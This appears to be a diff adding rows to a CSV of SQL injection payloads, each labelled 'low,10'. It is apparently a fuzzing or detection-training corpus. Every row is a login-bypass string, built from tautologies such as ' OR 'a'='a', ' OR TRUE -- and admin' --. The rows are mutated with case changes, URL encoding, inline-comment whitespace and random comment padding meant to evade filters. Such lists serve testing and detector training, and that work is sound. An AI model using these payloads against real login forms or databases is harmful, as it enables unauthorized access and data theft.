+'	OR	'A'='A'	#	MiIXNJv,low,10
+' or 'a'='a' # pkvaeq -- ryqbpnifwp,low,10
+' OR 'A'='A',low,10
+'%20OR%20'a'='a'%20/*%20test%20*/%20#%20bRaNXXM,low,10
+""" or ""a""=""a"" -- comment",low,10
+'/**/OR/**/'a'='a' # MfBilmHdNk,low,10
+""" OR ""A""=""A""",low,10
+'%20||%20'a'='a' # AfenQZgehC,low,10
+' || 'a'='a',low,10
+' or 'A'='A' -- COMment,low,10
+' OR 'A'='A' -- comment,low,10
+' OR 'a'='a' /* test */,low,10
+'	or	'A'='a' # MySQL comment,low,10
+'/**/or/**/'A'='A',low,10
+'%20||%20'a'='a'%20#%20mmDsuI,low,10
+'%20OR%20'a'='a' /* test */,low,10
+' OR 'a'='a' -- xmiIFUTHSw,low,10
+' or 'a'='a' -- comment,low,10
+'/**/||/**/'a'='a',low,10
+'/**/OR/**/'a'='a'/**/--/**/SyPYPgNQvX,low,10
+'%20OR%20'a'='a' # MySQL comment,low,10
+' || 'a'='a' # MySQL comment,low,10
+' or 'A'='A' -- QjJtxZeiV,low,10
+'+or+'A'='A',low,10
+'	OR	'a'='a'	#	MySQL	comment,low,10
+' OR 'a'='a' -- FtEZbR # yxXeALb # MySQL comment,low,10
+' || 'a'='a' -- KozMKrfYB,low,10
+' oR 'a'='A',low,10
+' oR 'A'='a' /* TEst */,low,10
+'+or+'a'='a' -- vaokdolnn,low,10
+' OR 'a'='a' # DLGBTCU # MySQL comment,low,10
+'/**/OR/**/'a'='a'/**//*/**/test/**/*/,low,10
+' OR 'a'='a' -- QNceiTCB,low,10
+'	OR	'a'='a' # MySQL comment,low,10
+'/**/OR/**/'a'='a'/**/#/**/GANZhyDZL,low,10
+' Or 'a'='A' -- oBdYUeTr,low,10
+' Or 'A'='a' /* test */,low,10
+"""%20OR%20""a""=""a""",low,10
+'%20OR%20'a'='a'%20--%20SKSbtlds,low,10
+'%20or%20'A'='A',low,10
+'%20OR%20'a'='a' -- UVNvc,low,10
+' OR 'a'='a' # yIIWPn,low,10
+'	||	'a'='a',low,10
+' or 'A'='a' /* test */,low,10
+'/**/OR/**/'a'='a' /* test */,low,10
+' OR 'a'='a' # xscVKbe,low,10
+'/**/OR/**/'a'='a'/**/#/**/RvLAvoun,low,10
+'/**/OR/**/'A'='A',low,10
+'/**/OR/**/'a'='a'/**/#/**/MySQL/**/comment,low,10
+' or 'a'='a' -- rEPiTgjc,low,10
+' or 'A'='a' -- GIrgvXFMFR,low,10
+' OR 'a'='a' /* test */ -- pnOdO,low,10
+' Or 'a'='A',low,10
+' OR 'a'='a' -- DmGVtQUguC,low,10
+'+OR+'a'='a' # cXvWVgsFr,low,10
+'/**/OR/**/'a'='a' -- comment,low,10
+' || 'A'='A',low,10
+'+OR+'a'='a' /* test */ # QmZRBp,low,10
+""" or ""a""=""a""",low,10
+' OR 'a'='a' /* test */ # piknT,low,10
+'	or	'a'='a',low,10
+'	OR	'A'='A',low,10
+' || 'a'='a' -- DtFxK,low,10
+'%20or%20'A'='A' -- zpSPGeBw,low,10
+'	OR	'a'='a' # MySQL comment -- comment,low,10
+'%20or%20'a'='a',low,10
+' OR 'a'='a' /* test */ # WmwxBPT -- NdxJlLa,low,10
+' || 'a'='a' /* test */,low,10
+' OR 'a'='a' # AzFcoZ,low,10
+""" oR ""a""=""a"" -- OdqAzTmgCc",low,10
+'/**/OR/**/'a'='a'/**/--/**/comment,low,10
+' OR 'a'='a' /* test */ -- tMoJRg,low,10
+' || 'a'='a' # gDfXsgB,low,10
+'%20or%20'A'='A'%20--%20CoMMenT,low,10
+'%20||%20'a'='a',low,10
+' OR 'A'='A' # CxZIfOA,low,10
+' OR 'a'='a' # YskPQ,low,10
+'%20OR%20'a'='a'/**/#/**/MySQL/**/comment,low,10
+' OR 'A'='A' -- XjAqbt,low,10
+'+OR+'a'='a'+#+qcILpke,low,10
+' OR 'a'='a' -- SrMiiGzzwV,low,10
+'+OR+'a'='a'+--+vWwVDeQ,low,10
+""" OR ""A""=""A"" # MySQL comment",low,10
+'+OR+'A'='A',low,10
+"""%20%20OR%20%20""a""=""a"" # LlmArgDDb",low,10
+' OR 'a'='a' /* test */ # PfkcFR,low,10
+"""+OR+""a""=""a""/**/#/**/MySQL/**/comment",low,10
+"""/**/or/**/""a""=""a""",low,10
+'/**/OR/**/'a'='a'/**/#/**/OAnIDWrA	--	comment,low,10
+' OR 'a'='a' # FNyuDVlrO # klyZl,low,10
+'+Or+'a'='A'+--+CoMMEnT,low,10
+'	OR	'a'='a' /* test */,low,10
+' Or 'a'='a' -- comment # MySQL comment,low,10
+' OR 'a'='A',low,10
+' OR 'A'='A' # MySQL comment,low,10
+"""%20OR%20""a""=""a""/**/--/**/comment",low,10
+""" or ""A""=""A""",low,10
+'/**/OR/**/'A'='A'/**/--/**/otnWu,low,10
+'	or	'a'='a'  --  comment,low,10
+' OR 'a'='a' -- FDrVw /* test */,low,10
+'/**/OR/**/'a'='a'/**/#/**/comment,low,10
+'%20OR%20'a'='a'%20--%20comment,low,10
+'%20||%20'A'='A',low,10
+' || 'a'='a' # TEwgNBWIDU # UTtJCZ,low,10
+'%20OR%20'A'='A',low,10
+'/**/OR/**/'a'='a'/**/#/**/gxtnu/**/#/**/MySQL/**/comment,low,10
+'%20OR%20'a'='a'%20/*%20test%20*/,low,10
+'%20OR%20'a'='a'%20#%20xWBscNHFsl -- comment,low,10
+' OR 'a'='a' /* test */ /* test */ -- yVsfclBAvA,low,10
+'	||	'a'='a'	#	ofmblvpcT	#	MySQL	comment,low,10
+'/**//**/OR/**//**/'a'='a'/**//**/#/**//**/ueLmA/**//**/#/**//**/BdJWGf/**//*/**/test/**/*/,low,10
+' or 'a'='A',low,10
+' or 'A'='A' -- ZWKUkVT,low,10
+'+OR+'A'='A' /* test */,low,10
+' OR 'a'='a' /* test */ # MySQL comment # comment,low,10
+' or 'a'='a' /* test */ # mysql comment # vakhxkhwz,low,10
+' or 'A'='A' -- ppeON /* TEST */ /* TEST */,low,10
+'/**/||/**/'A'='A',low,10
+' oR 'a'='a' /* test */ -- commENT,low,10
+' or 'A'='A' -- COMMENT,low,10
+'+OR+'a'='a'/**//*/**/test/**/*/,low,10
+'%20OR%20'a'='a'%20/*%20test%20*/%20/*%20test%20*/,low,10
+'/**/OR/**/'a'='a'/**/#/**/GSNAtbD,low,10
+'	OR	'a'='a' -- comment,low,10
+""" || ""A""=""A""",low,10
+""" || ""a""=""a""",low,10
+' OR 'a'='a' # FiYYK -- lHXdEnL -- comment,low,10
+"""%20or%20""a""=""a""",low,10
+' or 'A'='A' # yjCAx /* test */ # BUAXQpza,low,10
+'	OR	'A'='A'	#	MySQL	comment,low,10
+'/**/OR/**/'a'='a' -- uOQDK,low,10
+' || 'A'='a' # mYsqL COmmEnT,low,10
+'%20%20OR%20%20'a'='a',low,10
+'	OR	'a'='a'/**/--/**/comment,low,10
+'	OR	'a'='a'	/*	test	*/+--+comment,low,10
+""" OR ""a""=""a"" # MySQL comment",low,10
+'%20OR%20'A'='A'%20#%20TOTgCz,low,10
+'%20or%20'A'='A' -- AEuqIYYCW # mYsql COMMENT,low,10
+' OR 'a'='a' # BPJNEQRy,low,10
+'/**/OR/**/'a'='a' -- YyoozCog # yogBJz,low,10
+'+OR+'a'='a'+#+kaXOjGT,low,10
+' OR 'a'='a' # MySQL comment -- comment -- haWARj,low,10
+'%20OR%20'a'='a'%20#%20uULzwAtaX%20--%20comment,low,10
+'	OR	'A'='A'	#	MYSQL	COMMENT,low,10
+'/**/or/**/'a'='a',low,10
+'	OR	'a'='a'	#	SXzxRS,low,10
+'	OR	'a'='a'+#+RVYPiz,low,10
+' OR 'a'='a' # MySQL comment /* test */,low,10
+'+OR+'a'='a'+#+comment # QcAFngZuJ,low,10
+'	Or	'A'='A',low,10
+'+||+'a'='a',low,10
+""" or ""A""=""A"" /* test */",low,10
+'%20oR%20'a'='a' -- iEWYZvzla,low,10
+' oR 'a'='a',low,10
+' || 'A'='A' # MBaZA,low,10
+' || 'a'='a' -- EANqqjumB,low,10
+'%20Or%20'a'='A' /* test */,low,10
+'/**/or/**/'A'='A'/**//*/**/TEST/**/*/,low,10
+' or 'A'='A' /* test */,low,10
+' || 'A'='A' -- BAKXTHYY,low,10
+' OR 'a'='a' /* test */ -- comment,low,10
+' OR 'A'='A' # QVXUVBNNN,low,10
+' || 'A'='A' -- COMMENT -- SXmdcy -- COMMENT,low,10
+'	OR	'A'='A' -- zZdaD,low,10
+' OR 'a'='a' # comment -- comment -- comment,low,10
+' or 'a'='a' # mySQl cOMmEnt,low,10
+""" OR ""a""=""a"" # ICxeaIPM",low,10
+' OR 'a'='a' # ewQTx,low,10
+"""/**/or/**/""A""=""A""",low,10
+'/**/OR/**/'a'='a' # kiyyNdvQe,low,10
+'+OR+'a'='a' # MySQL comment,low,10
+"""	OR	""A""=""A"" /* TEST */",low,10
+' OR 'a'='a' # NyaqzvdnpJ # dYMEylOx,low,10
+' OR 'a'='a' # svkRRVSSod,low,10
+'/**/OR/**/'a'='a'+#+wjrMwwVIb,low,10
+' OR 'a'='a' # MySQL comment -- RLOkyzO,low,10
+""" OR ""a""=""a"" # MySQL comment # MySQL comment # bMUJMQ",low,10
+'+OR+'a'='a'+#+comment,low,10
+'+OR+'a'='a'+--+comment,low,10
+'	Or	'A'='A' /* tEsT */,low,10
+'+or+'A'='a' -- RPTqjo,low,10
+'+||+'a'='a' -- VxFsgeq # MTDMvBPHzp,low,10
+'+OR+'a'='a' -- iypbg,low,10
+""" Or ""A""=""a""",low,10
+"""/**/OR/**/""a""=""a""",low,10
+' OR 'a'='a' -- comment # vNxUaXHF,low,10
+"""/**/OR/**/""A""=""A""/**/#/**/MYSQL/**/COMMENT",low,10
+'/**/or/**/'a'='a'/**/#/**/ESneyP/**/#/**/cqLbL,low,10
+"""+OR+""a""=""a"" -- comment",low,10
+' OR 'A'='A' /* TEST */,low,10
+' oR 'a'='a' # ZTqoNY,low,10
+'%20or%20'A'='a',low,10
+'+OR+'A'='A' -- CqGHB,low,10
+' Or 'a'='a' # plRwu,low,10
+'%20or%20'a'='a'%20--%20comment,low,10
+'+or+'a'='a'+#+mysql+comment+--+alyrxhhgl,low,10
+'	or	'A'='A',low,10
+""" oR ""A""=""a"" /* tESt */",low,10
+""" || ""A""=""a"" -- COMmENt",low,10
+""" OR ""A""=""A"" -- comment",low,10
+'%20OR%20'A'='A' -- comment,low,10
+'+||+'a'='a'%20--%20uCAwkLU,low,10
+'+OR+'a'='a' /* test */ -- xpvkviSTv,low,10
+"""		OR		""a""=""a""",low,10
+' OR 'A'='A' /* test */,low,10
+'	OR	'a'='a'	/*	test	*/,low,10
+""" OR ""a""=""a"" /* test */",low,10
+' OR 'a'='a' /* test */ -- cthetzF /* test */,low,10
+' or 'a'='a' -- yddwwcs # avrbcfa,low,10
+' or 'a'='A' -- CommeNt # MySQL comment,low,10
+'/**//**/OR/**//**/'a'='a',low,10
+'+or+'a'='a'+--+comment,low,10
+' or 'a'='a' # mysql comment,low,10
+' or 'A'='A' # mYsql COMMENT,low,10
+'%20OR%20'a'='a'%20--%20bfoTimVb -- qWkMeUgf -- comment,low,10
+'	or	'a'='a'	#	mysql	comment/**/#/**/MySQL/**/comment,low,10
+'+OR+'a'='a'%20#%20MySQL%20comment # fECnmT,low,10
+'+OR+'a'='a' /* test */,low,10
+"""	oR	""A""=""a""	#	mYsQL	COMmENT",low,10
+'	OR	'a'='a'	#	KOssBmlB # xGQtsft,low,10
+'%20or%20'A'='A' -- comment,low,10
+' or 'a'='a' /* test */,low,10
+'/**/or/**/'A'='A' # MySQL comment,low,10
+'/**/OR/**/'A'='A' /* tESt */,low,10
+' OR 'a'='a' -- comment -- mlaWiCJCk,low,10
+' OR 'A'='A' -- COMMENT,low,10
+""" or ""a""=""a"" -- comment # nxscuwiayy",low,10
+' OR TRUE --,low,10
+' || TRUE --,low,10
+'+OR+TRUE+-- -- comment,low,10
+'+OR+TRUE+--,low,10
+'++OR++TRUE++-- -- bEpFS,low,10
+'	OR	TRUE	--,low,10
+'	OR	TRUE	-- -- igoccrZ,low,10
+""" OR TRUE --",low,10
+"""	OR	TRUE	--",low,10
+' OR TRUE -- /* test */,low,10
+'/**/OR/**/TRUE/**/#,low,10
+' Or TrUe -- -- comment,low,10
+'%20or%20true%20--,low,10
+' OR TRUE -- # fXgPJjun,low,10
+' OR TRUE -- -- GBhEGGLfZM,low,10
+' OR TRUE -- -- zUiAfnQ,low,10
+' OR TRUE -- # MySQL comment,low,10
+' or true -- /* test */ # jJxoF,low,10
+' OR trUE --,low,10
+' OR TRUE -- -- comment,low,10
+' or true --,low,10
+' or true -- -- xRIIJC,low,10
+' OR TRUE -- # vKjNBZG -- GmccH,low,10
+' OR TRUE #,low,10
+"""%20or%20true%20--",low,10
+' OR TRUE -- -- ZAxHNJHxH,low,10
+""" OR TRUE -- -- qgDsOoz",low,10
+'	OR	TRUE	-- -- BEcyBzkm,low,10
+"""/**/OR/**/TRUE/**/--",low,10
+""" or true --",low,10
+'/**/OR/**/TRUE/**/--/**/--/**/comment,low,10
+'/**/or/**/true/**/--,low,10
+'/**/OR/**/TRUE/**/-- -- comment,low,10
+' OR TRUE # /* test */ # MySQL comment,low,10
+'%20OR%20TRUE%20--,low,10
+""" OR trUE --",low,10
+' OR TRUE -- /* test */ -- comment,low,10
+'+or+true+--+--+COMMENT,low,10
+' OR TRUE -- -- aTtvkTj,low,10
+' OR TRUE # -- RkSMVzEtS,low,10
+'/**/OR/**/TRUE/**/--/**//*/**/test/**/*/,low,10
+'	||	TRUE	--,low,10
+' oR tRuE --,low,10
+' OR TRUE -- /* test */ -- qpGhHk,low,10
+'	OR	TRUE	-- -- comment,low,10
+'+OR+TRUE+#,low,10
+' OR TRUE -- # ISULselY # nNKfHN,low,10
+' OR TRUE -- /* TEST */,low,10
+' OR TRUE # /* test */,low,10
+' OR TRUE # /* test */ # comment,low,10
+'	OR	TRUE	--	--	comment,low,10
+'	oR	tRUE	--,low,10
+'/**/OR/**/TRUE/**/-- -- NAgUkJT,low,10
+""" or true -- # MySQL comment",low,10
+'/**/oR/**/tRUE/**/--,low,10
+'/**/OR/**/TRUE/**/--,low,10
+'+oR+tRUE+--,low,10
+'+oR+tRuE+-- # MySQL comment,low,10
+'%20OR%20TRUE%20--%20#%20IdnfsAR,low,10
+""" OR TRUE -- /* test */",low,10
+' oR TruE -- -- comment,low,10
+""" OR TRUE -- -- comment",low,10
+' OR TRUE -- -- QHdvs,low,10
+' OR TRUE # # comment -- comment,low,10
+'+OR+TRUE+-- -- whBoDPuj,low,10
+'/**/OR/**/TRUE/**/-- -- KqQek -- comment,low,10
+' OR TRUE -- # OHClYUCvNc,low,10
+'	OR	TRUE	-- # zkoKLPOObJ,low,10
+'+oR+TRUe+--+#+CNtCyCFse,low,10
+' Or tRUE --,low,10
+' OR TRUE -- # ewtpVIWyfr,low,10
+'	OR	TRUE	--	/*	test	*/	/*	test	*/,low,10
+' or true -- /* TEST */,low,10
+"""/**/OR/**/TRUE/**/#",low,10
+'+or+true+--,low,10
+'+||+TRUE+--,low,10
+""" OR TrUE --",low,10
+' or TruE --,low,10
+' or true -- # mysql comment,low,10
+'	or	true	--,low,10
+'+OR+TRUE+-- # wZLSFIe,low,10
+' OR TRUE -- -- ggRQfqIOq,low,10
+' or true -- /* test */,low,10
+' or true -- -- XRsdRlF,low,10
+'/**/OR/**/TRUE/**/--/**/#/**/VWXLl,low,10
+'/**/||/**/TRUE/**/--,low,10
+'+OR+TRUE+--+/*+test+*/,low,10
+' || TrUe --,low,10
+'+OR+TRUE+-- # wmDuFtzx,low,10
+' OR TRUE -- # vWcFe # qKtTwmB,low,10
+' OR TRUE -- -- ZDDGYyHa,low,10
+' OR TRUE -- # MySQL comment # FHMJW,low,10
+' oR tRue --,low,10
+' OR TRUE -- # IGwESGvBpX,low,10
+' OR TrUE --,low,10
+' or true -- # QltThNQ,low,10
+'%20oR%20trUE%20#,low,10
+"""%20OR%20TRUE%20--",low,10
+' or tRuE --,low,10
+' OR TRUE -- # RWraHNEA,low,10
+' OR TRUE -- # MySQL comment # comUjip -- comment,low,10
+' OR TRUE -- # MySQL comment # MySQL comment,low,10
+' or true -- # mYsql COMMENT,low,10
+' OR TRUE -- -- wIQdZ # MySQL comment,low,10
+'+OR+TRUE+--+--+comment,low,10
+'+OR+TRUE+-- # MySQL comment,low,10
+'%20oR%20tRuE%20--%20/*%20TEST%20*/,low,10
+""" OR TRUE -- -- jYVSIxPmX # MySQL comment",low,10
+'+OR+TRUE+--+#+MySQL+comment+#+tqconsflR+#+MySQL+comment,low,10
+'+||+TRUE+--+--+comment+--+comment+--+comment,low,10
+' OR TRUE -- -- COMMENT,low,10
+'	||	true	--,low,10
+' or true -- # mYsql COMMENT # mYsql COMMENT,low,10
+'%20OR%20TRUe%20--,low,10
+' Or TRUE -- /* Test */,low,10
+'%20OR%20TRUE%20--+#+MySQL+comment+#+eKnGf+--+fFREXT,low,10
+'	OR	TRUE	--	--	comment	/*	test	*/	/*	test	*/,low,10
+'	||	TRUE	# # MyGrP # ZnwHbUbH,low,10
+""" OR TRUE -- -- CqiHZex # MySQL comment",low,10
+'/**/or/**/TRue/**/--,low,10
+' OR TRUE -- # JljdrON /* test */ /* test */,low,10
+'+OR+TRUE+-- /* test */,low,10
+'/**/OR/**/TRUE/**/--	--	pXEeMC,low,10
+'/**/||/**/TRUE/**/--/**//*/**/test/**/*/ -- comment,low,10
+' OR TRUE # # comment,low,10
+'	OR	TRUE	-- # MYSQL COMMENT # MySQL comment,low,10
+'%20OR%20TRUE%20-- -- comment,low,10
+'+or+true+# # MySQL comment,low,10
+' or true # -- comment,low,10
+""" OR TRUE -- -- comment -- CixNoSH",low,10
+'	Or	TRuE	--	#	mYSql	COMMeNT /* TEST */,low,10
+""" OR TRUE -- -- qugvRhPzP -- comment",low,10
+'/**/or/**/true/**/#,low,10
+' OR trUe # # YnXqckNI # ComMeNT -- BOmpjZQG,low,10
+'/**/OR/**/TRUE/**/--/**/--/**/comment /* test */ -- ftbAmPR,low,10
+'%20OR%20TRUE%20--%20--%20comment -- zHAaae,low,10
+'%20%20OR%20%20TRUE%20%20--%20%20#%20%20DpVjzUlKZ,low,10
+'%20||%20TRUE%20--%20--%20comment	#	MySQL	comment,low,10
+'%20OR%20TRUE%20-- # IgNRq,low,10
+"""+OR+TRUE+--",low,10
+'	OR	TRUE	--	--	apggzu,low,10
+'	or	true	-- /* test */,low,10
+' OR TRUE # -- comment,low,10
+"""+OR+TRUE+--+--+comment -- quVee",low,10
+'%20OR%20TRUE%20--%20--%20qtYCYGnEr,low,10
+' OR tRUE -- # bUHps -- FvBEtbleQ,low,10
+'/**/OR/**/TRUE/**/-- # MYSQL COMMENT,low,10
+'	OR	TRUE	#	#	PKaFLZ,low,10
+""" or true -- -- comment",low,10
+'+||+TRUE+-- # MySQL comment,low,10
+'	OR	TRUE	-- /* test */,low,10
+'%20OR%20TRUE%20-- /* test */ -- comment,low,10
+'%20OR%20TRuE%20-- # HqGchxaS,low,10
+'%20OR%20TRUE%20-- /* test */ /* test */,low,10
+' || true --,low,10
+'  OR  TRUE  -- # MySQL comment,low,10
+' Or TRUe -- -- comment,low,10
+'	or	true	--	#	agedgowlt,low,10
+'+OR+TRUE+-- -- CKEPEyHnpW,low,10
+""" OR TRUE #",low,10
+'/**/||/**/true/**/--,low,10
+"""%20||%20TRUE%20-- # qCxLTo",low,10
+' || TRUE -- /* test */ -- comment,low,10
+'/**//**/OR/**//**/TRUE/**//**/-- -- comment,low,10
+' || TRUE -- # MySQL comment,low,10
+'	OR	TRUE	--	#	MySQL	comment,low,10
+""" or true # /* test */",low,10
+'/**/or/**/true/**/--/**/--/**/comment,low,10
+'/**/or/**/true/**/# # COMMENT,low,10
+' || TRUE # /* test */,low,10
+'%20oR%20TruE%20#,low,10
+'	OR	TRUE	--	--	aOGUj,low,10
+'+||+true+--,low,10
+' || TRUE #,low,10
+'%20||%20TRUE%20--,low,10
+'/**/OR/**/trUE/**/#,low,10
+'+Or+TrUE+-- /* test */,low,10
+"""+OR+TRUE+--+#+JycAQy",low,10
+""" or true -- -- COMMENT # VbddxgS",low,10
+' OR TRUE -- # QQWqWY -- comment,low,10
+'	OR	TRUE	--	/*	test	*/ /* test */,low,10
+'/**/Or/**/tRUE/**/-- /* test */,low,10
+'		OR		TRUE		--,low,10
+'%20||%20true%20-- # ZBaHWarM,low,10
+'/**/or/**/true/**/-- # MySQL comment,low,10
+'%20OR%20TrUe%20#,low,10
+'	OR	TRUE	-- -- NtZoPnG # MySQL comment,low,10
+'%20OR%20TRUE%20#+#+comment -- comment,low,10
+""" OR TRUE -- /* TEST */",low,10
+'%20or%20true%20-- -- comment,low,10
+'+or+true+# # AnniTOvg,low,10
+'	OR	TRUE	-- # OPOJY,low,10
+' OR TRUE -- /* test */ # jkzIJjtw -- comment,low,10
+' or true -- /* test */ # MySQL comment,low,10
+'/**/OR/**/TRUE/**/--/**/--/**/McyEesIxP,low,10
+'	Or	trUE	--	#	aNSwQbqv,low,10
+' or true -- -- COMMENT,low,10
+' or true -- -- COMMENT -- BhApmUDLd -- XlfOHmjvrL,low,10
+'+||+TRUE+--+/*+TEST+*/,low,10
+'	oR	true	--,low,10
+""" OR TRUE -- -- iXrNhb -- comment -- EUHeouGFIJ",low,10
+' OR tRUE #,low,10
+'%20OR%20TRUE%20-- # uLzapW /* test */ -- comment,low,10
+'++OR++TRUE++--+--+rAFzN,low,10
+""" || true --",low,10
+' oR True -- -- comment,low,10
+'%20or%20true%20--/**/#/**/SusaYX,low,10
+' or true #,low,10
+'%20OR%20TRUE%20--%20/*%20TEST%20*/,low,10
+'%20OR%20TRUE%20#,low,10
+' or true -- /* test */ /* test */,low,10
+'	OR	TRUE	#,low,10
+'	OR	TRUE	-- # GNWXXbOm,low,10
+""" || TRUE --",low,10
+'	OR	TRUE	--	--	uRZHSb -- cOwFpVrQa,low,10
+'%20or%20true%20--%20#%20mysql%20comment # MySQL comment,low,10
+'+OR+TRUE+--+--+BOcsazq,low,10
+'	or	tRuE	--,low,10
+' or true -- -- wsdzgkcg,low,10
+' OR TRUE # # MySQL comment,low,10
+'+||+truE+--,low,10
+'	or	true	--	--	comment,low,10
+'/**/OR/**/tRUE/**/--,low,10
+'+OR+TRUE+--+#+GYYCZEVHKJ+--+comment,low,10
+""" OR TRUE -- /* test */ /* test */",low,10
+'	or	tRue	--/**/--/**/waRgPGf,low,10
+'%20Or%20TRuE%20--%20/*%20tESt%20*/,low,10
+' or tRUe -- /* test */ # CNvmCH,low,10
+"""	OR	TRUE	--%20/*%20test%20*/",low,10
+'	OR	TRUE	-- -- sfwYiTPs /* test */,low,10
+'+||+TRUE+--+#+MyrPfoWcI,low,10
+'/**/||/**/TRUE/**/-- # EIASimovik,low,10
+"""+or+true+--",low,10
+'+OR+tRuE+--,low,10
+' OR TRUE # # EmxuQE,low,10
+' OR TRUE -- # lbmQI,low,10
+' or tRUE -- -- COMMEnT,low,10
+'+or+tRuE+--+#+AgGNBHpne,low,10
+'+||+TRUe+--,low,10
+' or true -- # fcwzz /* test */,low,10
+'%20OR%20TRUE%20# # MySQL comment,low,10
+'%20OR%20TRUE%20--%20--%20beHATG%20#%20uQOTIrl,low,10
+' or true # # rtefexuiyi,low,10
+"""  OR  TRUE  -- # WQMSHPPEQ",low,10
+'%20OR%20TRUE%20-- /* test */ /* test */ -- JeXste,low,10
+' || TRUE -- # maKMCQB /* test */,low,10
+"""+OR+TRUE+-- /* test */ /* test */",low,10
+"""	OR	TRUE	--	#	MySQL	comment",low,10
+"""+OR+TRUE+-- # MySQL comment",low,10
+' OR TRUE -- -- comment # blEmeM,low,10
+admin' --,low,10
+admIn' --,low,10
+"admin"" --",low,10
+"admin"" -- -- comment",low,10
+ADMIN'	--,low,10
+admin' -- # RwLqR,low,10
+admin'%20--,low,10
+"ADMIN"" -- -- GEPJJMTWR",low,10
+admin'	--,low,10
+aDmin'%20--,low,10
+admin'/**/--/**//*/**/test/**/*/,low,10
+admin'/**/--,low,10
+admin'+#,low,10
+admin' -- # HGskFFazUb,low,10
+ADMIN'  --,low,10
+ADMIN' --,low,10
+admin' # # yxtRHN # NBwjoeWlEj,low,10
+admin' -- # MySQL comment,low,10
+admin' -- -- nDcQAR -- comment,low,10
+admin' -- # MhggbHIrJ,low,10
+admin'	--	--	dKpQnwPxTr,low,10
+admin' -- -- comment # MySQL comment,low,10
+ADMIN'/**/-- # CUEPNIU,low,10
+"admin"" -- # MySQL comment -- jbYvmyo",low,10
+admin'	--	#	BiLKLL,low,10
+ADMIN' -- /* TEST */ # ScLIoDeJ,low,10
+admin' -- -- comment,low,10
+admin' -- -- HcAXUhl,low,10
+ADMIN' -- -- oDnGeyfn,low,10
+ADMIN' #,low,10
+ADMIN' -- # MPcynFcihF,low,10
+admin' #,low,10
+admin'+--,low,10
+Admin' --,low,10
+admin'/**/-- # MySQL comment,low,10
+"ADMIN"" #",low,10
+admin' -- /* test */,low,10
+AdmIn'	--,low,10
+admin'%20--%20/*%20test%20*/,low,10
+admin'	--	#	CvweQbg,low,10
+admin'/**/--/**/#/**/CLwEhIm,low,10
+"admin""/**/--/**/--/**/LhQxKO",low,10
+admin' -- -- bIexH,low,10
+admin' -- # XHnSMwL,low,10
+ADmIN' --,low,10
+adMIn'+--,low,10
+admin' -- # jwBVGKfpmm,low,10
+adMIN' -- # MYsQL cOMMent -- coMMenT,low,10
+admin'	-- -- comment,low,10
+ADMIN' -- # MYSQL COMMENT # MYSQL COMMENT,low,10
+admin' -- -- mWAMSExo,low,10
+admin'%20--%20/*%20test%20*/%20/*%20test%20*/,low,10
+Admin'+--,low,10
+admin' -- -- lhbMoS,low,10
+"admin"" -- # MySQL comment",low,10
+admin'  --,low,10
+"admin"" -- -- PnrjzHI",low,10
+ADMIN'%20--,low,10
+admin'/**/-- -- UZTjLJZYw,low,10
+ADMIN' -- # ecgdMKqRUy -- TWmvCUs,low,10
+ADMIN'	#,low,10
+aDmin' -- # MySQL comment # atDWtPOWp,low,10
+admin' # /* test */ -- comment,low,10
+ADmIn' #,low,10
+admin' -- -- GoaDiNY,low,10
+admin'+--+#+nmHCCM,low,10
+admin'%20--%20/*%20test%20*/%20#%20MySQL%20comment,low,10
+aDmIn' -- /* tEst */,low,10
+admin'%20-- -- comment # PNcUoNGh,low,10
+admin' -- -- comment /* test */,low,10
+admin' -- -- lEJzAfUBd,low,10
+admin' -- -- qtwArBv,low,10
+admin' -- -- HJbIO,low,10
+admin'/**/--/**/--/**/zROTeoVI,low,10
+admin' -- -- UXElkLwZo,low,10
+ADMIN' -- -- BYFSLKVAHN,low,10
+aDmIN' --,low,10
+admin' -- -- vMMjN,low,10
+aDMIN' --,low,10
+AdmiN' -- # DQnccJc,low,10
+aDMiN' --,low,10
+admin' -- -- aiyoYAUFqg,low,10
+ADMIN'/**/--,low,10
+adMin' --,low,10
+admin'/**/#,low,10
+admin' # # HLRzxDHpP # AAHmExJgm,low,10
+ADMiN' --,low,10
+admin' -- # Yfvxu,low,10
+admin'	-- # wRjeb,low,10
+adMIn' --,low,10
+admin' -- -- pselweyemn,low,10
+ADMIN'+#,low,10
+ADMIN' # /* test */,low,10
+aDMiN'/**/-- # MySQL comment,low,10
+"ADMIN""  --",low,10
+admin'	--	/*	test	*/ -- AyLoBxrM,low,10
+admin' -- # IjXsKMNBs,low,10
+"admin""+--",low,10
+"admin"" # -- comment /* test */",low,10
+admin'/**/#/**/#/**/comment,low,10
+admin' -- # mYsql COMMENT # rLZUOmmvKU,low,10
+admin' -- # dhnUVCJp -- yHAjiO,low,10
+"admin""%20-- -- comment",low,10
+admin' -- # MySQL comment # MySQL comment # UuocTls,low,10
+admin' -- -- iTkHQ,low,10
+"ADMIN"" --",low,10
+admin'/**/--/**/#/**/DZFpTyXEd,low,10
+admin'%20#%20#%20npYwi%20#%20RvFeau,low,10
+admin' -- # MySQL comment /* test */,low,10
+admin'/**/--	#	FTMuTGN,low,10
+admin' # # sjPRmsgxrh,low,10
+ADMIN'/**/#,low,10
+admin' # # MySQL comment,low,10
+admin' # # MySQL comment # MySQL comment,low,10
+ADmIN' -- -- CommEnT /* tEsT */,low,10
+admin'%20#,low,10
+admin'/**/--/**/#/**/lbIwRTRW /* test */ /* test */,low,10
+ADMIN' -- -- COMMENT # hTndjbly,low,10
+admin'+-- # SSxvpHwMza # eDtXpTDWZ -- comment,low,10
+admin' -- # bylyLSGu,low,10
+aDMIn' --,low,10
+admin'+--+--+cBZAs	--	comment,low,10
+admin'/**/--/**/#/**/mysql/**/comment,low,10
+admin' -- -- YjZJfAgh # MySQL comment # MySQL comment -- comment # cSVkKbNC,low,10
+admin'+--+/*+test+*/,low,10
+admin' -- # hXZZtzhXW,low,10
+admin'	#,low,10
+ADMIN'%20-- # wYnwmo,low,10
+Admin'/**/--/**/--/**/HAZNA,low,10
+admin' # -- OWwyQzaJ,low,10
+admin' # /* test */,low,10
+"admin"" -- -- comment -- comment # kAvvp",low,10
+admin'	--	#	pvVttI	#	MySQL	comment,low,10
+"admin"" # -- hqwAawcG",low,10
+"admin""/**/--",low,10
+aDmiN'+--,low,10
+aDmIN'+#,low,10
+admin'	--	--	comment/**/--/**/fYUtV,low,10
+AdMIN'	--,low,10
+ADMIN'+-- -- KNUiYfQ,low,10
+"admiN""+--",low,10
+admin'+--+#+mdwFmol,low,10
+"admin"" -- # JPGVfiAkd",low,10
+admin' -- # mysql comment,low,10
+admin'/**/-- -- NoDpZkWLU,low,10
+"admin"" # # MySQL comment",low,10
+"ADMIN"" -- # YHEACUONM",low,10
